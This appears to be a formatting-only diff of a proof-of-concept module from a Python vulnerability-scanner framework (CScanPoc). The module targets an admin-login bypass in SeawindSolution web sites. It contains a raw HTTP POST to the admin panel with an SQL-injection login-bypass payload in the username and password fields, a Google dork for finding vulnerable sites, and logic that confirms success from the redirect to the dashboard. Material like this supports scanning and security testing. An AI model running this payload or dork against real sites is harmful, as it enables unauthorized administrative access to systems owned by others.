@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'SeawindSolution_0001' # 平台漏洞编号，留空
+    vuln_id = 'SeawindSolution_0001'  # 平台漏洞编号，留空
     name = 'SeawindSolution 万能密码'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-07-24'  # 漏洞公布时间
     desc = '''
         Seawind Solution Bypass Admin Page Vulnerability.
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'SeawindSolution'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '3d2ed21e-8d97-44bd-84b2-2dc03fe58064'
@@ -32,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Google Dork : intext:"Design & Developed By Seawind Solution Pvt.Ltd."
+
+            # Google Dork : intext:"Design & Developed By Seawind Solution Pvt.Ltd."
             hh = hackhttp.hackhttp()
             raw = """
 POST /adminpanel/index.php HTTP/1.1
@@ -50,7 +52,7 @@ A_USERNAME=%27%3D%27+%27OR%27&A_PASSWORD=%27%3D%27+%27OR%27
             """
 
             verify_url = self.target + '/adminpanel/index.php'
-            code, head,res, errcode, _ = hh.http(verify_url, raw=raw)
+            code, head, res, errcode, _ = hh.http(verify_url, raw=raw)
 
             if code == 302 and 'location: dashboard.php' in head:
                 #security_hole(url + "\t'=' 'OR','=' 'OR'")
@@ -62,6 +64,7 @@ A_USERNAME=%27%3D%27+%27OR%27&A_PASSWORD=%27%3D%27+%27OR%27
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
